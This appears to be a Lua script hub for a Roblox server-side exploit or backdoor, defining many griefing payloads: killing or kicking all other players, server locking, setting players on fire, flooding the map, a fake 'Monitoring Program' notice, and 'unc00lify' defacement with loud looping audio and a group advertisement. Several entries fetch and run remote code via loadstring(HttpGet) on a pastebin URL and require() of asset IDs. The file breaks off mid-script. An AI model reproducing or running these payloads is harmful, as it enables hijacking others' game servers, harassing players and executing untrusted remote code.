	end

	outerSphere.Touched:Connect(affectObject)
	innerSphere.Touched:Connect(affectObject)

	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") then
			local distance = (obj.Position - position).Magnitude
			if distance <= 10 then
				affectObject(obj)
			end
		end
	end

	local boom = Instance.new("Sound")
	boom.SoundId = "rbxassetid://128993426058979"
	boom.Volume = 5
	boom.TimePosition = 0.2
	boom.PlayOnRemove = true
	boom.Parent = outerSphere
	boom:Destroy()

	local boom2 = Instance.new("Sound")
	boom2.SoundId = "rbxassetid://9057675920"
	boom2.Volume = 10
	boom2.TimePosition = 0.5
	boom2.PlayOnRemove = true
	boom2.Parent = outerSphere
	boom2:Destroy()

	task.spawn(function()
		local totalTime = 4
		local start = tick()
		while tick() - start < totalTime do
			local progress = (tick() - start) / totalTime
			local size = 1 + (180 - 1) * progress
			local transparency = 0.2 + (1 - 0.2) * progress
			local innerTransparency = 0.6 + (1 - 0.6) * progress

			outerSphere.Size = Vector3.new(size, size, size)
			innerSphere.Size = Vector3.new(size * 0.95, size * 0.95, size * 0.95)

			outerSphere.Transparency = transparency
			innerSphere.Transparency = innerTransparency

			outerSphere.CFrame = CFrame.new(position)
			innerSphere.CFrame = CFrame.new(position)

			RunService.RenderStepped:Wait()
		end
		outerSphere:Destroy()
	end)
end

local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:FindFirstChild("HumanoidRootPart")
local hum = character:FindFirstChildWhichIsA("Humanoid")

for _, part in ipairs(character:GetDescendants()) do
	if part:IsA("BasePart") or part:IsA("Decal") then
		part.Transparency = 1
	end
	if part:IsA("BasePart") then
		part.Anchored = true
	end
end

if hrp then
	createExplosion(hrp.Position)
end

if hum then
	hum.Health = 0
end
]], "CS / SS")

cscript("godmode", [[
local Players = game:GetService("Players")
local player = Players.LocalPlayer

coroutine.wrap(function()
	while true do
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		
		if humanoid then
			humanoid.MaxHealth = 99999
			humanoid.Health = 99999
		end

		if not character:FindFirstChildOfClass("ForceField") then
			local ff = Instance.new("ForceField")
			ff.Visible = false
			ff.Parent = character
		end

		task.wait(0)
	end
end)()
]], "CS / SS")

cscript("set map on fire", [[
local fyecol = Color3.fromHex("4051ED")
local secfyecol = Color3.fromHex("99a3ff")

function fyre(obj)
    if obj:IsA("BasePart") then
        local fye = Instance.new("Fire")
        fye.Size = 10
        fye.Heat = 1
        fye.Color = fyecol
        fye.SecondaryColor = secfyecol
        fye.Parent = obj
    end
end

for _, item in pairs(workspace:GetDescendants()) do
    fyre(item)
end
]], "CS / SS")

cscript("clear players", [[
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

for _, player in pairs(Players:GetPlayers()) do
	if player ~= localPlayer then
		player:Destroy()
	end
end

for _, item in pairs(workspace:GetChildren()) do
	if item:IsA("Model") and Players:GetPlayerFromCharacter(item) and Players:GetPlayerFromCharacter(item) ~= localPlayer then
		item:Destroy()
	end
end
]], "CS / SS")

cscript("clear messages", [[
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") then
				message:Destroy()
			end
		end
]], "CS / SS")

cscript("clear labeled messages", [[
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name == "dontdeleteme" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name == "dontdeleteme" then
				message:Destroy()
			end
		end
]], "CS / SS")

cscript("clear unlabeled messages", [[
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "dontdeleteme" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "dontdeleteme" then
				message:Destroy()
			end
		end
]], "CS / SS")

cscript("billboard psa", [[
local imageId = "rbxassetid://79869170880681"

function billbord(part)
	local existingGui = part:FindFirstChildOfClass("BillboardGui")
	if existingGui then existingGui:Destroy() end

	local billboardGui = Instance.new("BillboardGui")			
	billboardGui.Size = UDim2.new(20, 0, 10, 0)
	billboardGui.AlwaysOnTop = true
	billboardGui.Parent = part
	billboardGui.Adornee = part

	local imageLabel = Instance.new("ImageLabel")			
	imageLabel.Size = UDim2.new(1, 0, 1, 0)
	imageLabel.Image = imageId
	imageLabel.BackgroundTransparency = 1
	imageLabel.Parent = billboardGui
end

function isPlayerHead(part)
	return part:IsA("Part") and part.Name == "Head"
		and part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
end

function addbillbord()
	for _, descendant in pairs(workspace:GetDescendants()) do
		if isPlayerHead(descendant) then
			billbord(descendant)
		end
	end

	workspace.DescendantAdded:Connect(function(newDescendant)
		if isPlayerHead(newDescendant) then
			billbord(newDescendant)
		end
	end)
end

addbillbord()
]], "CS / SS")

cscript("self destruct on death", [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

local function createExplosion(position)
	local outerSphere = Instance.new("Part")
	outerSphere.Shape = Enum.PartType.Ball
	outerSphere.Size = Vector3.new(1, 1, 1)
	outerSphere.Anchored = true
	outerSphere.CanCollide = false
	outerSphere.Material = Enum.Material.Neon
	outerSphere.Color = Color3.fromHex("4051ED")
	outerSphere.Transparency = 0.2
	outerSphere.CFrame = CFrame.new(position)
	outerSphere.Name = "ExplosionSphere"
	outerSphere.Parent = workspace

	local innerSphere = Instance.new("Part")
	innerSphere.Shape = Enum.PartType.Ball
	innerSphere.Size = Vector3.new(0.85, 0.85, 0.85)
	innerSphere.Anchored = true
	innerSphere.CanCollide = false
	innerSphere.Material = Enum.Material.Neon
	innerSphere.Color = Color3.new(1, 1, 1)
	innerSphere.Transparency = 0.6
	innerSphere.CFrame = CFrame.new(position)
	innerSphere.Parent = outerSphere

	local touchedParts = {}

	local function affectObject(hit)
		if touchedParts[hit] then return end
		touchedParts[hit] = true

		local model = hit:FindFirstAncestorOfClass("Model")
		local hum = model and model:FindFirstChildWhichIsA("Humanoid")

		if hum and hum.Health > 0 and model ~= player.Character then
			hum.Health = 0
		end
	end

	outerSphere.Touched:Connect(affectObject)
	innerSphere.Touched:Connect(affectObject)

	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("BasePart") then
			local distance = (obj.Position - position).Magnitude
			if distance <= 10 then
				affectObject(obj)
			end
		end
	end

	local boom = Instance.new("Sound")
	boom.SoundId = "rbxassetid://128993426058979"
	boom.Volume = 5
	boom.TimePosition = 0.2
	boom.PlayOnRemove = true
	boom.Parent = outerSphere
	boom:Destroy()

	local boom2 = Instance.new("Sound")
	boom2.SoundId = "rbxassetid://9057675920"
	boom2.Volume = 10
	boom2.TimePosition = 0.5
	boom2.PlayOnRemove = true
	boom2.Parent = outerSphere
	boom2:Destroy()

	task.spawn(function()
		local totalTime = 4
		local start = tick()
		while tick() - start < totalTime do
			local progress = (tick() - start) / totalTime
			local size = 1 + (180 - 1) * progress
			local transparency = 0.2 + (1 - 0.2) * progress
			local innerTransparency = 0.6 + (1 - 0.6) * progress

			outerSphere.Size = Vector3.new(size, size, size)
			innerSphere.Size = Vector3.new(size * 0.95, size * 0.95, size * 0.95)

			outerSphere.Transparency = transparency
			innerSphere.Transparency = innerTransparency

			outerSphere.CFrame = CFrame.new(position)
			innerSphere.CFrame = CFrame.new(position)

			RunService.RenderStepped:Wait()
		end
		outerSphere:Destroy()
	end)
end

local function onCharacterDeath()
	local character = player.Character
	if character then
		local hrp = character:FindFirstChild("HumanoidRootPart")
		if hrp then
			createExplosion(hrp.Position)
		end
	end
end

local function setupCharacter()
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoid = character:FindFirstChildWhichIsA("Humanoid")

	if humanoid then
		humanoid.Died:Connect(onCharacterDeath)
	end
end

player.CharacterAdded:Connect(setupCharacter)

if player.Character then
	setupCharacter()
end
]], "CS / SS")

cscript("set everyone on fire", [[
local fyecol = Color3.fromHex("4051ED")
local secfyecol = Color3.fromHex("99a3ff")

function fyre(character)
    if character and character:IsA("Model") then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            for _, part in pairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    local fye = Instance.new("Fire")
                    fye.Size = 10
                    fye.Heat = 1
                    fye.Color = fyecol
                    fye.SecondaryColor = secfyecol
                    fye.Parent = part
                end
            end
            
            task.spawn(function()
                while humanoid.Health > 0 do
                    humanoid.Health = humanoid.Health - 20
                    task.wait(0.5)
                end
            end)
        end
    end
end

for _, player in pairs(game.Players:GetPlayers()) do
    if player.Character then
        fyre(player.Character)
    end
end
]], "CS / SS")

cscript("roblox is down!!!", [[
local imageId = "rbxassetid://7866786419"

function billbord(part)
	local existingGui = part:FindFirstChildOfClass("BillboardGui")
	if existingGui then existingGui:Destroy() end

	local billboardGui = Instance.new("BillboardGui")			
	billboardGui.Size = UDim2.new(20, 0, 12, 0)
	billboardGui.AlwaysOnTop = true
	billboardGui.Parent = part
	billboardGui.Adornee = part

	local imageLabel = Instance.new("ImageLabel")			
	imageLabel.Size = UDim2.new(1, 0, 1, 0)
	imageLabel.Image = imageId
	imageLabel.BackgroundTransparency = 1
	imageLabel.Parent = billboardGui
end

function isPlayerHead(part)
	return part:IsA("Part") and part.Name == "Head"
		and part.Parent and part.Parent:FindFirstChildOfClass("Humanoid")
end

function addbillbord()
	for _, descendant in pairs(workspace:GetDescendants()) do
		if isPlayerHead(descendant) then
			billbord(descendant)
		end
	end

	workspace.DescendantAdded:Connect(function(newDescendant)
		if isPlayerHead(newDescendant) then
			billbord(newDescendant)
		end
	end)
end

addbillbord()
]], "CS / SS")

cscript("tilt baseplate", [[
local baseplate = game.Workspace:FindFirstChild("Baseplate")
if baseplate and baseplate:IsA("BasePart") then
	task.spawn(function()
		for angle = 0, 43, 1 do
			baseplate.Orientation = Vector3.new(angle, 34, 0)
		end
	end)
end
]], "CS / SS")

cscript("darken", [[
	local l = Instance.new("ColorCorrectionEffect",game.Lighting)
	l.Contrast,l.Saturation,l.Brightness = 2, -0.75, 0.375
	l.TintColor = Color3.new(0,0,0)
]], "CS / SS")

cscript("reset lighting", [[
	local Lighting = game:GetService("Lighting")
	local Camera = game:GetService("Workspace").CurrentCamera

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}

	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("PostEffect") or effect:IsA("BloomEffect") or effect:IsA("ColorCorrectionEffect") or 
				effect:IsA("SunRaysEffect") or effect:IsA("DepthOfFieldEffect") or effect:IsA("MotionBlurEffect") then
				effect:Destroy()
			end
		end
	end

	local function restoreCameraEffects()
		Camera.FieldOfView = 70
		Camera.CameraSubject = nil
		Camera.CameraType = Enum.CameraType.Custom
		for _, obj in ipairs(Camera:GetChildren()) do
			if obj:IsA("Script") or obj:IsA("LocalScript") then
				obj:Destroy()
			end
		end
	end

	task.spawn(function()
		for property, value in pairs(defaultValues) do
			pcall(function()
				Lighting[property] = value
			end)
		end

		restoreLightingEffects()
		restoreCameraEffects()
	end)
]], "CS / SS")

cscript("thick of it", [[
local ChatService = game:GetService("Chat")
local Players = game:GetService("Players")

local function bubl(text)
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end
end

wait(1)

bubl("I'm in the thick of it, everybody knows")

wait(3)


bubl("They know me where it snows, I skied in and they froze")

wait(3.5)


bubl("I don't know no nothin' 'bout no ice, I'm just cold")

wait(3)


bubl("Forty somethin' milli' subs or so, I've been told")

wait(3.6)

bubl("I'm in my prime, and this ain't even final form")

wait(3.2)

bubl("They knocked me down, but still, my feet, they find the floor")

wait(3.2)

bubl("I went from living rooms straight out to sold-out tours")

wait(3.5)

bubl("Life's a fight, but trust, I'm ready for the war")

wait(3.3)

bubl("Woah, oh, oh")

wait(3.05)

bubl("This is how the story goes")

wait(3.6)

bubl("Woah, oh, oh")

wait(2.9)

bubl("I guess this is how the story goes")

wait(3.3)

bubl("I'm in the thick of it, everybody knows")

wait(3)

bubl("They know me where it snows, I skied in and they froze")

wait(3.5)

bubl("I don't know no nothin' 'bout no ice, I'm just cold")

wait(3)

bubl("Forty somethin' milli' subs or so, I've been told")

wait(3.3)

bubl("From the screen to the ring, to the pеn, to the king")

wait(3)

bubl("Where's my crown? That's my bling, always drama when I ring")

wait(4.1)

bubl("See, I believe that if I see it in my heart")

wait(3)

bubl("Smash through the ceiling 'cause I'm reaching for the stars")

wait(3.7)

bubl("Woah, oh, oh")

wait(3.05)

bubl("This is how the story goes")

wait(3.6)

bubl("Woah, oh, oh")

wait(2.9)

bubl("I guess this is how the story goes")

wait(3.3)

bubl("I'm in the thick of it, everybody knows")

wait(3)

bubl("They know me where it snows, I skied in and they froze")

wait(3.5)

bubl("I don't know no nothin' 'bout no ice, I'm just cold")

wait(3)

bubl("Forty somethin' milli' subs or so, I've been told")

wait(3.6)

bubl("Highway to heaven, I'm just cruisin' by my lone'")

wait(3.2)

bubl("They cast me out, left me for dead, them people cold")

wait(3.2)

bubl("My faith in God, mind in the sun, I'm 'bout to sow (Yeah)")

wait(3.5)

bubl("My life is hard, I took the wheel, I cracked the code (Yeah-yeah, woah-oh-oh)")

wait(6)

bubl("Ain't nobody gon' save you, man, this life will break you (Yeah, woah-oh-oh)")

wait(5.8)

bubl("In the thick of it, this is how the story goes")

wait(4.5)

bubl("I'm in the thick of it, everybody knows")

wait(3)

bubl("They know me where it snows, I skied in and they froze")

wait(3.5)

bubl("I don't know no nothin' 'bout no ice, I'm just cold")

wait(3)

bubl("Forty somethin' milli' subs or so, I've been told")

wait(3.6)

bubl("I'm in the thick of it, everybody knows")

wait(3)

bubl("They know me where it snows, I skied in and they froze")

wait(3.5)

bubl("I don't know no nothin' 'bout no ice, I'm just cold")

wait(3)

bubl("Forty somethin' milli' subs or so, I've been told")

wait(3.5)

bubl("Wоah, оh, оh")

wait(3.05)

bubl("This is hоw the stоry goes")

wait(3.6)

bubl("Woah, oh, oh")

wait(2.9)

bubl("I guess this is how the story goes")
]], "CS / SS")

cscript("soul serverside", [[
	loadstring(game:HttpGet("https://pastebin.com/raw/adceDwMv"))()
]], "LS")

cscript("ro-xploit reborn", [[
	require(96184029574075)("%replace%with%username%")
]], "RQ")

cscript("killbrick rain", [[
local SpawnRate = 0.5
local BatchSize = 10
local FallSpeed = 50
local SizeVariation = 10

local ShapeTypes = {
	{Class = "Part", Shape = Enum.PartType.Block},
	{Class = "Part", Shape = Enum.PartType.Cylinder},
	{Class = "Part", Shape = Enum.PartType.Ball},
	{Class = "Part", Shape = Enum.PartType.Wedge},
	{Class = "Part", Shape = Enum.PartType.CornerWedge}
}

local ShapeContainer = Instance.new("Folder")
ShapeContainer.Name = "DeadlyRain"
ShapeContainer.Parent = workspace

local LocalPlayer = game:GetService("Players").LocalPlayer

local function createShapeBatch()
	for i = 1, BatchSize do
		local shapeData = ShapeTypes[math.random(1, #ShapeTypes)]

		local part = Instance.new(shapeData.Class)
		part.Shape = shapeData.Shape
		part.Material = Enum.Material.Neon
		part.Color = Color3.fromHex("4051ED")

		local baseSize = math.random(5, SizeVariation)
		part.Size = Vector3.new(baseSize, baseSize, baseSize)

		local camera = workspace.CurrentCamera
		local spawnX = math.random(-200, 200)
		local spawnZ = math.random(-200, 200)
		local spawnPos = Vector3.new(
			camera.CFrame.Position.X + spawnX,
			camera.CFrame.Position.Y + 100,
			camera.CFrame.Position.Z + spawnZ
		)

		part.Position = spawnPos
		part.Anchored = false
		part.CanCollide = true
		part.CanTouch = true
		part.CanQuery = true

		part.Orientation = Vector3.new(
			math.random(0, 360),
			math.random(0, 360),
			math.random(0, 360)
		)

		local bodyVelocity = Instance.new("BodyVelocity")
		bodyVelocity.Velocity = Vector3.new(
			math.random(-20, 20),
			-FallSpeed - math.random(0, 30),
			math.random(-20, 20)
		)
		bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
		bodyVelocity.Parent = part

		part.Touched:Connect(function(hit)
			local humanoid = hit.Parent:FindFirstChildOfClass("Humanoid")
			local player = game:GetService("Players"):GetPlayerFromCharacter(hit.Parent)

			if humanoid and player and player ~= LocalPlayer then
				humanoid.Health = 0
			end
		end)

		part.Parent = ShapeContainer
	end
end

local function rainShapes()
	while true do
		createShapeBatch()
		task.wait(SpawnRate)
	end
end

rainShapes()
]], "CS / SS")

cscript("KJ", [[
require(89529616632600)("%replace%with%username%", "KJ")
]], "RQ")

cscript("saitama", [[
require(14499140823)("%replace%with%username%", "saitama2")
]], "RQ")

cscript("assign to team", [[
local Teams = game:GetService("Teams")
local localPlayer = game.Players:FindFirstChild("%replace%with%username%")

local TEAM_NAME = "unable"
local TEAM_COLOR = Color3.fromHex("000000")

local function createTeam()
	for _, team in ipairs(Teams:GetTeams()) do
		if team.Name == TEAM_NAME then
			return team
		end
	end

	local newTeam = Instance.new("Team")
	newTeam.Name = TEAM_NAME
	newTeam.TeamColor = BrickColor.new(TEAM_COLOR)
	newTeam.Parent = Teams

	return newTeam
end

local function assignToTeam(team)
	localPlayer.Team = team
end

local team = createTeam()
assignToTeam(team)
]], "CS / SS")

cscript("discord notifications", [[
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
while true do local n = Instance.new("Sound") n.SoundId = "rbxassetid://18482508961" n.Parent = workspace n.Volume = 1.6 n:Play() wait(math.random(1, 3)) end
]], "CS / SS")

cscript("server lock", [[
while true do
for a, xb in pairs(game.Players:children()) do
if xb.Name~=game.Players.LocalPlayer.Name then xb:Destroy() end
end
wait(.69)
end
]], "CS / SS")

cscript("bloxiphant message", [[
local ChatService = game:GetService("Chat")
local Players = game:GetService("Players")

local function bubl(text)
	for _, player in ipairs(Players:GetPlayers()) do
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end
end

spawn(function()
	bubl("Your behavior is briefly being monitored under the Monitoring Program. To opt-out please contact Gerard B. (Bloxiphant) via e-mail or Roblox messages.")
end)
]], "CS / SS")

cscript("flood map", [[
local flood = Region3.new(Vector3.new(-1250,0,-1250), Vector3.new(1250, 500, 1250))
flood = flood:ExpandToGrid(4)
game.Workspace.Terrain:FillRegion(flood, 4, Enum.Material.Water)
]], "CS / SS")

cscript("HD admin", [[
	require(9985547712):give("%replace%with%username%")
]], "RQ")

cscript("taco rain", [[
game:GetService("RunService").Heartbeat:Connect(function()
	local v81 = true
	local v764 = Instance.new("SpecialMesh");
	v764.MeshType = Enum.MeshType.FileMesh;
	v764.Scale = Vector3.new(3, 3, 3);
	v764.MeshId = "http://www.roblox.com/asset/?id=14846869";
	v764.TextureId = "http://www.roblox.com/asset/?id=14846834";
	if (v81 == true) then
		local v899;
		local v900;
		if (game.Players ~= nil) then
			if (game.Players.LocalPlayer ~= nil) then
				if (game.Players.LocalPlayer.Character ~= nil) then
					v900 = game.Players.LocalPlayer.Character;
				else
					v900 = nil;
				end
			else
				v900 = nil;
			end
		else
			v900 = nil;
		end
		if (v900 ~= nil) then
			v899 = v900:GetModelCFrame();
		else
			v899 = CFrame.new(0, 0, 0);
		end
		local v901 = Instance.new("Part");
		v901.CanCollide = true;
		v901.RotVelocity = Vector3.new(math.random() * math.pi, math.random() * math.pi, math.random() * math.pi);
		local v904 = v764:clone();
		v904.Parent = v901;
		v904.Scale = Vector3.new(10, 10, 10);
		v901.CFrame = v899 * CFrame.new((math.random() * 500) - 250, math.random(100, 200), (math.random() * 500) - 250);
		v901.Parent = workspace;
		game:GetService("Debris"):AddItem(v901, 4);
	end
end)
]], "CS / SS")

cscript("duck rain", [[
game:GetService("RunService").Heartbeat:Connect(function()
	local v81 = true
	local v764 = Instance.new("SpecialMesh");
	v764.MeshType = Enum.MeshType.FileMesh;
	v764.Scale = Vector3.new(3, 3, 3);
	v764.MeshId = "http://www.roblox.com/asset/?id=9419831";
	v764.TextureId = "http://www.roblox.com/asset/?id=9419827";
	if (v81 == true) then
		local v899;
		local v900;
		if (game.Players ~= nil) then
			if (game.Players.LocalPlayer ~= nil) then
				if (game.Players.LocalPlayer.Character ~= nil) then
					v900 = game.Players.LocalPlayer.Character;
				else
					v900 = nil;
				end
			else
				v900 = nil;
			end
		else
			v900 = nil;
		end
		if (v900 ~= nil) then
			v899 = v900:GetModelCFrame();
		else
			v899 = CFrame.new(0, 0, 0);
		end
		local v901 = Instance.new("Part");
		v901.CanCollide = true;
		v901.RotVelocity = Vector3.new(math.random() * math.pi, math.random() * math.pi, math.random() * math.pi);
		local v904 = v764:clone();
		v904.Parent = v901;
		v904.Scale = Vector3.new(10, 10, 10);
		v901.CFrame = v899 * CFrame.new((math.random() * 500) - 250, math.random(100, 200), (math.random() * 500) - 250);
		v901.Parent = workspace;
		game:GetService("Debris"):AddItem(v901, 4);
	end
end)
]], "CS / SS")

cscript("unc00lify", [[
local batchSize = 1000000
local imageId = "rbxassetid://92724155258384"
local musicId = "rbxassetid://110251728423993"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
		sky.SkyboxFt = imageId
		sky.SkyboxLf = imageId
		sky.SkyboxRt = imageId
		sky.SkyboxUp = imageId
		sky.Parent = Lighting

		task.wait(2)
	end
end)

local function applyParticles(character)
    local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
    if not torso then return end
    
    for _, particle in ipairs(torso:GetChildren()) do
        if particle:IsA("ParticleEmitter") and particle.Texture ~= imageId then
            particle:Destroy()
        end
    end
    
    for _, velocitySpread in ipairs({0, 0, 0}) do
        local existing = false
        
        for _, particle in ipairs(torso:GetChildren()) do
            if particle:IsA("ParticleEmitter") and particle.Texture == imageId and particle.VelocitySpread == velocitySpread then
                existing = true
                break
            end
        end
        
        if not existing then
            local pe = Instance.new("ParticleEmitter")
            pe.Texture = imageId
            pe.VelocitySpread = velocitySpread
            pe.Parent = torso
        end
    end
end

task.spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character then
                applyParticles(player.Character)
            end
        end
        task.wait(2)
    end
end)

task.spawn(function()
	local Lighting = game:GetService("Lighting")

	local defaultValues = {
		Brightness = 2,
		Ambient = Color3.new(0.5, 0.5, 0.5),
		ColorShift_Bottom = Color3.new(0, 0, 0),
		ColorShift_Top = Color3.new(0, 0, 0),
		OutdoorAmbient = Color3.new(0.5, 0.5, 0.5),
		ClockTime = 14,
		FogColor = Color3.new(1, 1, 1),
		FogEnd = 10000000000,
		FogStart = 0,
		GeographicLatitude = 41.733,
		GlobalShadows = true,
		ExposureCompensation = 0,
		EnvironmentDiffuseScale = 1,
		EnvironmentSpecularScale = 1,
		ShadowSoftness = 0.2,
		Technology = Enum.Technology.Compatibility,
	}
	
	local function restoreLightingEffects()
		for _, effect in ipairs(Lighting:GetChildren()) do
			if effect:IsA("ColorCorrectionEffect") then
				effect:Destroy()
			end
		end
	end

	task.spawn(function()
		while true do
			for property, value in pairs(defaultValues) do
				pcall(function()
					Lighting[property] = value
				end)
			end
			restoreLightingEffects()
			task.wait(1)
		end
	end)
end)

local function applyParticlesToPart(part)
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture ~= imageId then
            child:Destroy()
        end
    end

    local alreadyHas = false
    for _, child in ipairs(part:GetChildren()) do
        if child:IsA("ParticleEmitter") and child.Texture == imageId then
            alreadyHas = true
            break
        end
    end

    if not alreadyHas then
        local pe = Instance.new("ParticleEmitter")
        pe.Texture = imageId
        pe.VelocitySpread = 360
        pe.Rate = 10
        pe.Lifetime = NumberRange.new(5)
        pe.Speed = NumberRange.new(10)
        pe.Parent = part
        pe.SpreadAngle = Vector2.new(0, 0)
		pe.Acceleration = Vector3.new(0, 0, 0)
		
		local fe = Instance.new("ParticleEmitter")
        fe.Texture = imageId
        fe.VelocitySpread = 360
        fe.Rate = 40
        fe.Lifetime = NumberRange.new(5)
        fe.Speed = NumberRange.new(10)
        fe.Parent = part
    end
end

task.spawn(function()
    while true do
        local parts = {}
        for _, part in ipairs(workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(parts, part)
            end
        end

        for i = 1, #parts, batchSize do
            for j = i, math.min(i + batchSize - 1, #parts) do
                applyParticlesToPart(parts[j])
            end
            
            task.wait(1)
        end

        task.wait(1)
    end
end)

local function clearDecals(part)
	for _, child in ipairs(part:GetChildren()) do
		if child:IsA("Decal") then
			child:Destroy()
		end
	end
end

local function applyDecals(part)
	for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
		local decal = Instance.new("Decal")
		decal.Texture = imageId
		decal.Face = face
		decal.Parent = part
	end
end

task.spawn(function()
	while true do
		local allParts = {}
		for _, part in ipairs(Workspace:GetDescendants()) do
			if part:IsA("BasePart") then
				table.insert(allParts, part)
			end
		end

		local index = 1
		while index <= #allParts do
			for i = index, math.min(index + 99, #allParts) do
				local part = allParts[i]
				part.Material = Enum.Material.Plastic
				clearDecals(part)
				applyDecals(part)
			end
			index += 100
			task.wait(1)
		end
	end
end)

task.spawn(function()
	while true do
		local sound = Workspace:FindFirstChild("canttouchthissound")
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "canttouchthissound"
			sound.SoundId = musicId
			sound.Looped = true
			sound.Volume = 999
			sound.Parent = Workspace
			sound:Play()
		end
		task.wait(2)
	end
end)

local function write(text, object)
	if object:IsA("Hint") then
		local count = object:FindFirstChild("Count")
		if not count then
			count = Instance.new("NumberValue")
			count.Name = "Count"
			count.Parent = object
		end
		count.Value += 1
		local startCount = count.Value

		for i = 1, #text do
			if count.Value == startCount then
				object.Text = string.sub(text, 1, i)
				task.wait(0.06)
			else
				break
			end
		end
	end
end

task.spawn(function()
	local bro = Instance.new("Hint")
	bro.Name = "canttouchthishint"
	bro.Parent = workspace

	spawn(function()
		while true do
			local existing = workspace:FindFirstChild("canttouchthishint")
			if not existing then
				local bro = Instance.new("Hint")
				bro.Name = "canttouchthishint"
				bro.Parent = workspace
				write("join team noxious later maybe idk | gg/bwdk8vAy8n", bro)
			end
			task.wait(1)
		end
	end)

	write("join team noxious later maybe idk | gg/bwdk8vAy8n", bro)
end)

spawn(function()
	while true do
		for _, hint in pairs(game:GetDescendants()) do
			if hint:IsA("Hint") and hint.Name ~= "canttouchthishint" then
				hint:Destroy()
			end
		end
		for _, message in pairs(game:GetDescendants()) do
			if message:IsA("Message") and message.Name ~= "canttouchthishint" then
				message:Destroy()
			end
		end
		for _, sound in pairs(game:GetDescendants()) do
			if sound:IsA("Sound") and sound.Name ~= "canttouchthissound" then
				sound:Destroy()
			end
		end
		wait(0.5)
	end
end)

task.spawn(function()
	while true do
		for _, player in ipairs(Players:GetPlayers()) do
			local function mute(container)
				for _, s in ipairs(container:GetDescendants()) do
					if s:IsA("Sound") and s.Playing then
						s.Playing = false
					end
				end
			end
			if player.Character then mute(player.Character) end
			local bp = player:FindFirstChildOfClass("Backpack")
			if bp then mute(bp) end
		end
		task.wait(2)
	end
end)
]], "CS / SS")

cscript("unableify", [[
local batchSize = 1000000
local imageId = "rbxassetid://82967466186087"
local musicId = "rbxassetid://85833437298815"

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")

task.spawn(function()
	while true do
		local oldSky = Lighting:FindFirstChildOfClass("Sky")
		if oldSky then
			oldSky:Destroy()
		end

		local sky = Instance.new("Sky")
		sky.Name = "PersistentSky"
		sky.SkyboxBk = imageId
		sky.SkyboxDn = imageId
